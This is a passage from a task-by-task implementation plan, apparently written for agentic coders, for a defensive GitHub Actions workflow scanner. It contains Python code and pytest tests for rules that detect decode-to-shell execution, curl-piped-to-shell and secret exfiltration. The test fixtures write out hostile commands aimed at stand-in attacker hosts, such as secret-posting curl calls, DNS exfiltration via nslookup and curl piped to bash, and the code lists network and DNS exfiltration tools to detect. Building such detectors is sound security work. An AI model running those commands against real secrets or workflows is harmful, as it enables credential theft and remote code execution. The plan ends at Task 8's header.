# Workflow-Threat Engine — Plan 2: Detection Rules Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking. **Depends on Plan 1 (Foundation) being complete.**

**Goal:** Implement the 13 combination detection rules over the taint-resolved view from Plan 1, plus the GitHub Actions platform adapter, shared shell/network helpers, and a rule registry that enforces visible-only suppression.

**Architecture:** `platforms.py` provides GitHub path globs and the research-verified untrusted-context grammar (18 explicit fields + suffix heuristic) and privileged-trigger sets. `shellutil.py` parses `run:` text for decoders/interpreters and outbound network/DNS sinks. `rules/__init__.py` registers rule callables and centrally applies suppression (high/crit exec/exfil/inj rules never suppress). Each `rules/*.py` module holds focused rule functions returning `WorkflowFinding`s.

**Tech Stack:** Python 3.9+ stdlib, `pytest`. No new deps. Zero network egress.

**Spec:** `docs/superpowers/specs/2026-06-04-workflow-threat-engine-design.md` (§4 catalog, §5 hardenings, §6 model). **Research:** `.audit/RESEARCH-workflow-engine-2026-06-04.md` (untrusted-input list, suffix heuristic, privileged triggers).

---

## Task 1: Line-tracking loader (upgrade parser so `step.line`/`job.line` are real)

Precise lines power accurate SARIF locations and suppression matching. PyYAML `safe_load` drops line info, so add a line-tracking loader.

**Files:**
- Modify: `credence/workflow_audit/parser.py`
- Test: `tests/test_workflow_parser.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_parser.py  (append)
def test_steps_and_jobs_carry_line_numbers():
    text = (
        "on: push\n"            # line 1
        "jobs:\n"               # line 2
        "  build:\n"            # line 3
        "    runs-on: x\n"      # line 4
        "    steps:\n"          # line 5
        "      - run: echo a\n"  # line 6
        "      - run: echo b\n"  # line 7
    )
    wf = parse_workflow(text, path="x")
    assert wf.jobs[0].line == 3
    assert wf.jobs[0].steps[0].line == 6
    assert wf.jobs[0].steps[1].line == 7


def test_line_key_not_leaked_into_env_maps():
    wf = parse_workflow(
        "on: push\njobs:\n  a:\n    runs-on: x\n    env:\n      K: v\n    steps: []",
        path="x")
    assert wf.jobs[0].env == {"K": "v"}   # no __line__ key
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_parser.py -k "line" -v`
Expected: FAIL — `wf.jobs[0].line == 0`, not 3.

- [ ] **Step 3: Write minimal implementation**

Replace the `yaml.safe_load(text)` calls in `parse_workflow` and `parse_action` with `_line_load(text)`, add the loader, and make `_env_to_str_map` skip the injected key. Add at the top of `parser.py`:

```python
# credence/workflow_audit/parser.py  (add near imports)
_LINE_KEY = "__line__"


class _LineLoader(yaml.SafeLoader):
    pass


def _construct_mapping(loader, node, deep=False):
    mapping = yaml.SafeLoader.construct_mapping(loader, node, deep=deep)
    mapping[_LINE_KEY] = node.start_mark.line + 1
    return mapping


_LineLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, _construct_mapping
)


def _line_load(text: str):
    return yaml.load(text, Loader=_LineLoader)  # noqa: S506 (custom SafeLoader subclass)
```

Update `_env_to_str_map` to skip the key:

```python
def _env_to_str_map(env: Any) -> Dict[str, str]:
    if isinstance(env, dict):
        return {str(k): "" if v is None else str(v)
                for k, v in env.items() if k != _LINE_KEY}
    return {}
```

Set lines in `_build_step` / `_build_job` (read `raw.get(_LINE_KEY, 0)`), and replace `yaml.safe_load` with `_line_load` in both `parse_workflow` and `parse_action`:

```python
def _build_step(idx: int, raw: Any) -> Step:
    if not isinstance(raw, dict):
        return Step(index=idx, name=None, uses=None, run=None)
    return Step(
        index=idx,
        name=(str(raw["name"]) if raw.get("name") is not None else None),
        uses=(str(raw["uses"]) if raw.get("uses") is not None else None),
        run=(str(raw["run"]) if raw.get("run") is not None else None),
        env=_env_to_str_map(raw.get("env")),
        with_={k: v for k, v in (raw.get("with") or {}).items() if k != _LINE_KEY}
              if isinstance(raw.get("with"), dict) else {},
        shell=(str(raw["shell"]) if raw.get("shell") is not None else None),
        line=int(raw.get(_LINE_KEY, 0)),
    )
```

```python
def _build_job(job_id: str, raw: Any) -> Job:
    if not isinstance(raw, dict):
        return Job(job_id=job_id)
    perms = raw.get("permissions", _ABSENT)
    job = Job(
        job_id=job_id,
        runs_on=raw.get("runs-on"),
        permissions=(None if perms is _ABSENT else perms),
        permissions_absent=(perms is _ABSENT),
        env=_env_to_str_map(raw.get("env")),
        uses=(str(raw["uses"]) if raw.get("uses") is not None else None),
        secrets_inherit=(raw.get("secrets") == "inherit"),
        line=int(raw.get(_LINE_KEY, 0)),
    )
    steps = raw.get("steps")
    if isinstance(steps, list):
        job.steps = [_build_step(i, s) for i, s in enumerate(steps)]
    return job
```

Also strip `_LINE_KEY` where `permissions` is a dict so it doesn't leak: in `parse_workflow`/`_build_job`, after assigning `permissions`, if it's a dict drop the key:

```python
def _clean_perms(perms):
    if isinstance(perms, dict):
        return {k: v for k, v in perms.items() if k != _LINE_KEY}
    return perms
```
Apply `_clean_perms(...)` to both workflow- and job-level `permissions` assignments.

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_parser.py -v`
Expected: PASS (all parser tests, incl. line tracking; `__line__` never leaks into env/with/permissions)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/parser.py tests/test_workflow_parser.py
git commit -m "feat(workflow-audit): line-tracking YAML loader for accurate locations"
```

---

## Task 2: `platforms.py` — GitHub adapter (paths, untrusted contexts, triggers, checkout-ref)

**Files:**
- Create: `credence/workflow_audit/platforms.py`
- Test: `tests/test_workflow_platforms.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_platforms.py
from credence.workflow_audit.platforms import (
    WORKFLOW_GLOBS, ACTION_GLOBS, untrusted_contexts, PRIVILEGED_TRIGGERS,
    CANONICAL_PRIVILEGED_TRIGGERS, is_pr_controlled_ref,
)


def test_globs_cover_workflows_and_actions():
    assert ".github/workflows/*.yml" in WORKFLOW_GLOBS
    assert ".github/workflows/*.yaml" in WORKFLOW_GLOBS
    assert ".github/actions/**/action.yml" in ACTION_GLOBS


def test_untrusted_explicit_field():
    found = untrusted_contexts(
        'echo "${{ github.event.pull_request.title }}"')
    assert "github.event.pull_request.title" in found


def test_untrusted_suffix_heuristic_on_event_paths():
    # not in the explicit 18 but ends in a known untrusted suffix -> flagged
    found = untrusted_contexts("${{ github.event.discussion.title }}")
    assert "github.event.discussion.title" in found


def test_untrusted_head_ref_non_event():
    assert "github.head_ref" in untrusted_contexts("${{ github.head_ref }}")


def test_trusted_context_not_flagged():
    # github.repository / github.sha are not attacker-controlled text sinks
    assert untrusted_contexts("${{ github.repository }} ${{ github.sha }}") == []


def test_canonical_vs_extended_triggers():
    assert "pull_request_target" in CANONICAL_PRIVILEGED_TRIGGERS
    assert "workflow_run" in CANONICAL_PRIVILEGED_TRIGGERS
    assert "issue_comment" in PRIVILEGED_TRIGGERS
    assert "issue_comment" not in CANONICAL_PRIVILEGED_TRIGGERS


def test_pr_controlled_ref_detection():
    assert is_pr_controlled_ref("${{ github.event.pull_request.head.sha }}")
    assert is_pr_controlled_ref("${{ github.head_ref }}")
    assert not is_pr_controlled_ref("${{ github.sha }}")
    assert not is_pr_controlled_ref("main")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_platforms.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/platforms.py
"""GitHub Actions platform adapter: discovery globs, untrusted-context grammar
(research-verified 18-field list + suffix heuristic), privileged-trigger sets,
and PR-controlled-ref detection. Other platforms are recognized by path only in
v1 (no GH-specific checks)."""

from __future__ import annotations

import re
from typing import List

WORKFLOW_GLOBS = [".github/workflows/*.yml", ".github/workflows/*.yaml"]
ACTION_GLOBS = [".github/actions/**/action.yml", ".github/actions/**/action.yaml",
                "action.yml", "action.yaml"]

# Research-verified explicit untrusted-input fields (GitHub Security Lab).
UNTRUSTED_FIELDS = {
    "github.event.issue.title", "github.event.issue.body",
    "github.event.pull_request.title", "github.event.pull_request.body",
    "github.event.comment.body", "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.pages.*.page_name",
    "github.event.commits.*.message",
    "github.event.head_commit.message",
    "github.event.head_commit.author.email",
    "github.event.head_commit.author.name",
    "github.event.commits.*.author.email",
    "github.event.commits.*.author.name",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.default_branch",
    "github.head_ref",
}
# GitHub Docs suffix heuristic (applied to github.event.* paths for recall).
UNTRUSTED_SUFFIXES = ("body", "default_branch", "email", "head_ref", "label",
                      "message", "name", "page_name", "ref", "title")

CANONICAL_PRIVILEGED_TRIGGERS = {"pull_request_target", "workflow_run"}
PRIVILEGED_TRIGGERS = CANONICAL_PRIVILEGED_TRIGGERS | {
    "issue_comment", "issues", "discussion", "discussion_comment",
    "schedule", "workflow_call",
}

_EXPR_RE = re.compile(r"\$\{\{\s*(github\.[A-Za-z0-9_.*\[\]'\"-]+?)\s*\}\}")
_PR_REF_RE = re.compile(
    r"github\.event\.pull_request\.head\.|github\.head_ref")


def _last_segment(expr: str) -> str:
    return expr.rstrip("]'\"").split(".")[-1]


def _is_untrusted(expr: str) -> bool:
    if expr in UNTRUSTED_FIELDS:
        return True
    if expr == "github.head_ref":
        return True
    if expr.startswith("github.event."):
        return _last_segment(expr) in UNTRUSTED_SUFFIXES
    return False


def untrusted_contexts(text: str) -> List[str]:
    """Return github.* expressions in `text` that are attacker-controllable."""
    out: List[str] = []
    for m in _EXPR_RE.finditer(text or ""):
        expr = m.group(1)
        if _is_untrusted(expr) and expr not in out:
            out.append(expr)
    return out


def is_pr_controlled_ref(value: str) -> bool:
    return bool(value) and bool(_PR_REF_RE.search(value))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_platforms.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/platforms.py tests/test_workflow_platforms.py
git commit -m "feat(workflow-audit): GitHub adapter — untrusted-context grammar + triggers"
```

---

## Task 3: `shellutil.py` — decoders, interpreters, outbound/DNS sink parsing

**Files:**
- Create: `credence/workflow_audit/shellutil.py`
- Test: `tests/test_workflow_shellutil.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_shellutil.py
from credence.workflow_audit.shellutil import (
    has_decode_to_shell, remote_pipe_to_shell, outbound_sinks, references_vars,
)


def test_decode_to_shell_variants():
    assert has_decode_to_shell("echo x | base64 -d | bash")
    assert has_decode_to_shell('eval "$(echo x | base64 --decode)"')
    assert has_decode_to_shell("python3 -c \"$(echo x | base64 -d)\"")
    assert has_decode_to_shell("echo x | gunzip | sh")


def test_decode_to_shell_negative():
    assert not has_decode_to_shell("base64 -d file > out.txt")  # decode, no shell
    assert not has_decode_to_shell("echo hello world")


def test_remote_pipe_to_shell():
    assert remote_pipe_to_shell("curl https://get.docker.com | sh") == "get.docker.com"
    assert remote_pipe_to_shell("wget -qO- https://evil.example/x | bash") == "evil.example"
    assert remote_pipe_to_shell("curl https://x.example -o f") is None  # not piped to shell


def test_outbound_sinks_classifies():
    sinks = outbound_sinks("curl -d @- https://evil.example/collect")
    assert any(s["host"] == "evil.example" and not s["dns"] for s in sinks)

    dyn = outbound_sinks("curl -d x $TARGET")
    assert any(s["dynamic"] for s in dyn)

    dns = outbound_sinks("nslookup $SECRET.attacker.example")
    assert any(s["dns"] for s in dns)


def test_references_vars():
    assert references_vars('curl -d "$TOKEN" x', {"TOKEN"})
    assert references_vars("echo ${TOKEN}", {"TOKEN"})
    assert not references_vars("echo hello", {"TOKEN"})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_shellutil.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/shellutil.py
"""Shell/network parsing helpers shared by exec & exfil rules. Operate on
normalized run text (Plan 1 normalize.py already applied)."""

from __future__ import annotations

import re
from typing import Dict, List, Set

_DECODERS = (
    "base64 -d", "base64 --decode", "base32 -d", "xxd -r", "xxd -p -r",
    "openssl enc -d", "gunzip", "gzip -d", "uudecode", "gpg -d", "gpg --decrypt",
)
_INTERPRETERS = (
    "python -c", "python3 -c", "node -e", "node --eval", "perl -e", "ruby -e",
    "php -r",
)
_SHELLS = ("bash", "sh", "zsh", "dash")
_HTTP_TOOLS = ("curl", "wget")
_DNS_TOOLS = ("nslookup", "dig", "host")


def _pipes_to_shell(text: str) -> bool:
    return any(re.search(rf"\|\s*{s}\b", text) for s in _SHELLS)


def has_decode_to_shell(run: str) -> bool:
    if not run:
        return False
    low = run.lower()
    if any(d in low for d in _DECODERS):
        if _pipes_to_shell(low):
            return True
        if re.search(r"eval\s+[\"']?\$\(", low):
            return True
        if any(i in low for i in _INTERPRETERS):
            return True
    return False


def remote_pipe_to_shell(run: str):
    """If a curl/wget output is piped to a shell, return its host (or None if dynamic)."""
    low = (run or "").lower()
    if not any(re.search(rf"\b{t}\b", low) for t in _HTTP_TOOLS):
        return None
    if not _pipes_to_shell(low):
        return None
    m = re.search(r"https?://([^\s/\"'|]+)", run)
    return m.group(1) if m else None


def outbound_sinks(run: str) -> List[Dict]:
    """Return outbound network sinks: {tool, host, dynamic, dns}."""
    sinks: List[Dict] = []
    low = (run or "").lower()
    for t in _HTTP_TOOLS:
        if re.search(rf"\b{t}\b", low):
            m = re.search(r"https?://([^\s/\"'|]+)", run)
            if m:
                sinks.append({"tool": t, "host": m.group(1),
                              "dynamic": False, "dns": False})
            elif re.search(rf"\b{t}\b[^\n]*\$\{{?\w+", run):
                sinks.append({"tool": t, "host": None,
                              "dynamic": True, "dns": False})
    for t in _DNS_TOOLS:
        if re.search(rf"\b{t}\b", low):
            sinks.append({"tool": t, "host": None, "dynamic": True, "dns": True})
    if re.search(r"\bnc\b|\bncat\b", low):
        sinks.append({"tool": "nc", "host": None, "dynamic": True, "dns": False})
    return sinks


def references_vars(run: str, var_names: Set[str]) -> bool:
    for v in var_names:
        if re.search(rf"\$\{{?{re.escape(v)}\b", run or ""):
            return True
    return False
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_shellutil.py -v`
Expected: PASS (6 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/shellutil.py tests/test_workflow_shellutil.py
git commit -m "feat(workflow-audit): shell/network sink parsing helpers"
```

---

## Task 4: Rule registry, `RuleContext`, `run_rules`, visible-suppression policy

**Files:**
- Create: `credence/workflow_audit/rules/__init__.py`
- Test: `tests/test_workflow_rules_registry.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rules_registry.py
from credence.workflow_audit.models import (
    Severity, Confidence, Platform, WorkflowFinding,
)
from credence.workflow_audit.allowlist import Suppression
from credence.workflow_audit.rules import (
    RuleContext, register, RULES, apply_suppressions, make_finding,
)


def _f(rule_id, sev, line=5):
    return WorkflowFinding(
        rule_id=rule_id, title="t", severity=sev, confidence=Confidence.HIGH,
        platform=Platform.GITHUB_ACTIONS, file_path="x", message="m", line=line)


def test_make_finding_attaches_frameworks_and_defaults():
    f = make_finding("WF-CFG-002", "Excessive perms", Severity.MEDIUM,
                     Confidence.HIGH, file_path="x", message="m",
                     cicd_sec=["CICD-SEC-5"], mitre=[])
    assert f.cicd_sec == ["CICD-SEC-5"]
    assert f.platform == Platform.GITHUB_ACTIONS


def test_low_severity_finding_suppressed_when_matching_directive_near():
    ctx = RuleContext(suppressions=[Suppression("WF-CFG-003", line=5, reason="ok")])
    out = apply_suppressions([_f("WF-CFG-003", Severity.LOW, line=5)], ctx)
    assert out[0].suppressed is True
    assert out[0].suppression_reason == "ok"


def test_high_exfil_finding_never_suppressed():
    ctx = RuleContext(suppressions=[Suppression("WF-EXFIL-001", line=5, reason="x")])
    out = apply_suppressions([_f("WF-EXFIL-001", Severity.HIGH, line=5)], ctx)
    assert out[0].suppressed is False   # high/crit exec/exfil/inj ignore suppression


def test_suppression_requires_line_proximity():
    ctx = RuleContext(suppressions=[Suppression("WF-CFG-003", line=99, reason="x")])
    out = apply_suppressions([_f("WF-CFG-003", Severity.LOW, line=5)], ctx)
    assert out[0].suppressed is False   # far-away directive does not apply
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rules_registry.py -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/__init__.py
"""Rule registry + central suppression. Each rule is a callable
(wf, resolved, ctx) -> Iterable[WorkflowFinding]. Suppression is visible-only:
findings are flagged suppressed (never deleted), and high/crit exec/exfil/inj
rules ignore suppression entirely (spec §6, v0.8.1 lesson)."""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Dict, Iterable, List, Set

from ..models import (
    Confidence, Platform, ResolvedStep, Severity, Workflow, WorkflowFinding,
)
from ..allowlist import Suppression

# rule-id prefixes whose High/Crit findings are NON-suppressible
_NON_SUPPRESSIBLE_PREFIXES = ("WF-EXEC", "WF-EXFIL", "WF-INJ")
_SUPPRESS_LINE_WINDOW = 2   # directive must be within +/- N lines of the finding


@dataclass
class RuleContext:
    platform: Platform = Platform.GITHUB_ACTIONS
    extra_hosts: Set[str] = field(default_factory=set)
    suppressions: List[Suppression] = field(default_factory=list)
    source: str = "working_tree"


RULES: List[Callable[..., Iterable[WorkflowFinding]]] = []


def register(fn: Callable[..., Iterable[WorkflowFinding]]):
    RULES.append(fn)
    return fn


def make_finding(rule_id, title, severity, confidence, *, file_path, message,
                 job=None, step_index=None, step_name=None, line=0, snippet="",
                 cicd_sec=None, mitre=None, remediation="",
                 platform=Platform.GITHUB_ACTIONS) -> WorkflowFinding:
    return WorkflowFinding(
        rule_id=rule_id, title=title, severity=severity, confidence=confidence,
        platform=platform, file_path=file_path, message=message, job=job,
        step_index=step_index, step_name=step_name, line=line, snippet=snippet,
        cicd_sec=list(cicd_sec or []), mitre=list(mitre or []),
        remediation=remediation,
    )


def _is_non_suppressible(f: WorkflowFinding) -> bool:
    high = f.severity in (Severity.HIGH, Severity.CRITICAL)
    return high and f.rule_id.startswith(_NON_SUPPRESSIBLE_PREFIXES)


def apply_suppressions(findings, ctx: RuleContext) -> List[WorkflowFinding]:
    for f in findings:
        if _is_non_suppressible(f):
            continue
        for s in ctx.suppressions:
            if s.rule_id == f.rule_id and abs(s.line - f.line) <= _SUPPRESS_LINE_WINDOW:
                f.suppressed = True
                f.suppression_reason = s.reason
                break
    return findings


def run_rules(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
              ctx: RuleContext) -> List[WorkflowFinding]:
    findings: List[WorkflowFinding] = []
    for fn in RULES:
        findings.extend(fn(wf, resolved, ctx))
    return apply_suppressions(findings, ctx)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rules_registry.py -v`
Expected: PASS (4 tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/__init__.py tests/test_workflow_rules_registry.py
git commit -m "feat(workflow-audit): rule registry + visible-only suppression policy"
```

---

## Task 5: `WF-EXEC-001` — runtime-decoded shell execution

**Files:**
- Create: `credence/workflow_audit/rules/exec_rules.py`
- Test: `tests/test_workflow_rule_exec.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_exec.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.exec_rules as exec_rules


def _run(text):
    wf = parse_workflow(text, path=".github/workflows/ci.yml")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    out = []
    out += exec_rules.wf_exec_001(wf, resolved, RuleContext())
    return out


SAME_STEP = """
on: push
jobs:
  b:
    runs-on: x
    steps:
      - run: echo aGk= | base64 -d | bash
"""
CROSS_STEP = """
on: push
jobs:
  b:
    runs-on: x
    steps:
      - run: echo aGk= | base64 -d > /tmp/p.sh
      - run: bash /tmp/p.sh
"""
BENIGN = """
on: push
jobs:
  b:
    runs-on: x
    steps:
      - run: |
          base64 -d secret.b64 > secret.bin
          echo "decoded a data file, not executing"
"""


def test_same_step_decode_to_shell_fires_high():
    out = _run(SAME_STEP)
    assert any(f.rule_id == "WF-EXEC-001" and f.severity.value == "HIGH" for f in out)


def test_cross_step_decode_then_run_fires_via_taint():
    out = _run(CROSS_STEP)
    assert any(f.rule_id == "WF-EXEC-001" for f in out)


def test_benign_decode_to_file_no_execution_does_not_fire():
    assert _run(BENIGN) == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_exec.py -k exec_001 -v`
Expected: FAIL — module/function not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/exec_rules.py
"""Pillar 1 execution rules: WF-EXEC-001 (runtime-decoded shell exec),
WF-EXEC-002 (remote script piped to shell)."""

from __future__ import annotations

import re
from typing import Dict, Iterable, List

from ..models import Confidence, ResolvedStep, Severity, Workflow
from ..shellutil import has_decode_to_shell
from . import RuleContext, make_finding, register

_EXEC_FILE_RE = re.compile(r"\b(?:bash|sh|zsh|dash|source|\.)\s+([\w./~-]+)")


@register
def wf_exec_001(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
                ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            run = rs.normalized_run
            if not run:
                continue
            hit = has_decode_to_shell(run)
            if not hit:
                # cross-step: this step executes a previously decoded file (taint)
                for m in _EXEC_FILE_RE.finditer(run):
                    if m.group(1) in rs.tainted_files:
                        hit = True
                        break
            if hit:
                out.append(make_finding(
                    "WF-EXEC-001", "Runtime-decoded shell execution",
                    Severity.HIGH, Confidence.HIGH,
                    file_path=wf.path, message="Encoded payload decoded and executed at runtime",
                    job=job_id, step_index=rs.step.index, step_name=rs.step.name,
                    line=rs.step.line, snippet=run[:200],
                    cicd_sec=["CICD-SEC-4"], mitre=["T1027", "T1059"],
                    remediation="Do not decode-and-execute at runtime; commit reviewed scripts.",
                ))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_exec.py -k exec_001 -v`
Expected: PASS (3 tests, incl. cross-step via taint and benign-no-exec negative)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/exec_rules.py tests/test_workflow_rule_exec.py
git commit -m "feat(workflow-audit): WF-EXEC-001 runtime-decoded shell execution"
```

---

## Task 6: `WF-EXEC-002` — remote script piped to shell (installer allowlist downgrade)

**Files:**
- Modify: `credence/workflow_audit/rules/exec_rules.py`
- Test: `tests/test_workflow_rule_exec.py` (append)

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_exec.py  (append)
import credence.workflow_audit.rules.exec_rules as _er


def _run002(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(_er.wf_exec_002(wf, resolved, RuleContext()))


def test_remote_pipe_to_shell_unknown_host_high():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - run: curl https://evil.example/i | bash")
    assert any(f.rule_id == "WF-EXEC-002" and f.severity.value == "HIGH" for f in out)


def test_known_installer_downgraded_to_info():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - run: curl https://get.docker.com | sh")
    f = [x for x in out if x.rule_id == "WF-EXEC-002"]
    assert f and f[0].severity.value == "INFO"


def test_no_pipe_to_shell_no_finding():
    out = _run002("on: push\njobs:\n  b:\n    runs-on: x\n    steps:\n"
                  "      - run: curl https://x.example -o file")
    assert [x for x in out if x.rule_id == "WF-EXEC-002"] == []
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_exec.py -k exec_002 -v`
Expected: FAIL — `wf_exec_002` not defined

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/exec_rules.py  (append)
from ..allowlist import is_installer_host
from ..shellutil import remote_pipe_to_shell


@register
def wf_exec_002(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
                ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            host = remote_pipe_to_shell(rs.normalized_run)
            if host is None and "|" not in (rs.normalized_run or ""):
                continue
            if host is None:
                continue
            installer = is_installer_host(host, ctx.extra_hosts)
            sev = Severity.INFO if installer else Severity.HIGH
            out.append(make_finding(
                "WF-EXEC-002", "Remote script piped to shell",
                sev, Confidence.MEDIUM,
                file_path=wf.path,
                message=f"Remote script from {host} piped to a shell",
                job=job_id, step_index=rs.step.index, step_name=rs.step.name,
                line=rs.step.line, snippet=rs.normalized_run[:200],
                cicd_sec=["CICD-SEC-3", "CICD-SEC-4"], mitre=["T1059"],
                remediation="Pin and verify install scripts; avoid curl|bash from untrusted hosts.",
            ))
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_exec.py -v`
Expected: PASS (all exec tests)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/exec_rules.py tests/test_workflow_rule_exec.py
git commit -m "feat(workflow-audit): WF-EXEC-002 remote-script-to-shell with installer downgrade"
```

---

## Task 7: `WF-EXFIL-001` — secret-tainted value to outbound sink

**Files:**
- Create: `credence/workflow_audit/rules/exfil_rules.py`
- Test: `tests/test_workflow_rule_exfil.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_workflow_rule_exfil.py
from credence.workflow_audit.parser import parse_workflow
from credence.workflow_audit.taint import resolve_job
from credence.workflow_audit.rules import RuleContext
import credence.workflow_audit.rules.exfil_rules as exfil_rules


def _run001(text):
    wf = parse_workflow(text, path="x")
    resolved = {j.job_id: resolve_job(wf, j) for j in wf.jobs}
    return list(exfil_rules.wf_exfil_001(wf, resolved, RuleContext()))


ENV_MAPPED = """
on: push
jobs:
  b:
    runs-on: x
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - run: curl -d "$TOKEN" https://evil.example/collect
"""
DNS_EXFIL = """
on: push
jobs:
  b:
    runs-on: x
    steps:
      - env:
          S: ${{ secrets.PROD }}
        run: nslookup "$S.attacker.example"
"""
BENIGN_DEPLOY = """
on: push
jobs:
  b:
    runs-on: x
    env:
      TOKEN: ${{ secrets.PROD }}
    steps:
      - run: curl -H "Authorization: $TOKEN" https://api.github.com/repos/me/me/deployments
"""


def test_env_mapped_secret_to_foreign_host_high():
    out = _run001(ENV_MAPPED)
    assert any(f.rule_id == "WF-EXFIL-001" and f.severity.value in ("HIGH", "CRITICAL")
               for f in out)


def test_dns_exfil_of_secret_fires():
    out = _run001(DNS_EXFIL)
    assert any(f.rule_id == "WF-EXFIL-001" for f in out)


def test_secret_to_platform_host_same_api_not_high():
    # talking to api.github.com is not treated as foreign-host exfil (no finding here)
    out = _run001(BENIGN_DEPLOY)
    assert all(f.severity.value not in ("HIGH", "CRITICAL") for f in out)
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/test_workflow_rule_exfil.py -k exfil_001 -v`
Expected: FAIL — module not found

- [ ] **Step 3: Write minimal implementation**

```python
# credence/workflow_audit/rules/exfil_rules.py
"""Pillar 1 exfiltration rules: WF-EXFIL-001 (secret -> outbound sink),
WF-EXFIL-002 (env/secret dump to network or log)."""

from __future__ import annotations

import re
from typing import Dict, Iterable, List

from ..models import Confidence, ResolvedStep, Severity, Workflow
from ..allowlist import is_platform_host
from ..shellutil import outbound_sinks, references_vars
from . import RuleContext, make_finding, register

_DIRECT_SECRET_RE = re.compile(r"\$\{\{\s*secrets\.[A-Za-z0-9_-]+\s*\}\}")
# write to a *foreign* path via the platform API (issues/gists/dispatches)
_PLATFORM_WRITE_RE = re.compile(r"/(?:gists|repos/[^/\s]+/[^/\s]+/(?:issues|dispatches))")


def _step_has_secret(rs: ResolvedStep) -> bool:
    run = rs.normalized_run
    if _DIRECT_SECRET_RE.search(run):
        return True
    return references_vars(run, set(rs.secret_vars.keys()))


@register
def wf_exfil_001(wf: Workflow, resolved: Dict[str, List[ResolvedStep]],
                 ctx: RuleContext) -> Iterable:
    out: List = []
    for job_id, steps in resolved.items():
        for rs in steps:
            if not _step_has_secret(rs):
                continue
            for sink in outbound_sinks(rs.normalized_run):
                sev = None
                host = sink["host"]
                if sink["dns"] or sink["dynamic"]:
                    sev = Severity.HIGH
                elif host and is_platform_host(host):
                    if _PLATFORM_WRITE_RE.search(rs.normalized_run):
                        sev = Severity.MEDIUM   # platform-channel abuse (could be legit)
                elif host:
                    sev = Severity.HIGH
                if sev is None:
                    continue
                out.append(make_finding(
                    "WF-EXFIL-001", "Secret value sent to outbound sink",
                    sev, Confidence.HIGH if sev == Severity.HIGH else Confidence.MEDIUM,
                    file_path=wf.path,
                    message=f"Secret-tainted value reaches {sink['tool']} "
                            f"({'DNS' if sink['dns'] else (host or 'dynamic host')})",
                    job=job_id, step_index=rs.step.index, step_name=rs.step.name,
                    line=rs.step.line, snippet=rs.normalized_run[:200],
                    cicd_sec=["CICD-SEC-4"], mitre=["T1567", "T1041"],
                    remediation="Never send secrets to external hosts; scope/rotate the secret.",
                ))
                break  # one finding per step is enough
    return out
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/test_workflow_rule_exfil.py -k exfil_001 -v`
Expected: PASS (3 tests, incl. env-mapped, DNS, and benign-platform negative)

- [ ] **Step 5: Commit**

```bash
git add credence/workflow_audit/rules/exfil_rules.py tests/test_workflow_rule_exfil.py
git commit -m "feat(workflow-audit): WF-EXFIL-001 secret->outbound-sink (env-resolved taint)"
```

---

## Task 8: `WF-EXFIL-002` — env/secret dump to network or log

**Files:**
- Modify: `credence/workflow_audit/rules/exfil_rules.py`
- Test: `tests/test_workflow_rule_exfil.py` (append)

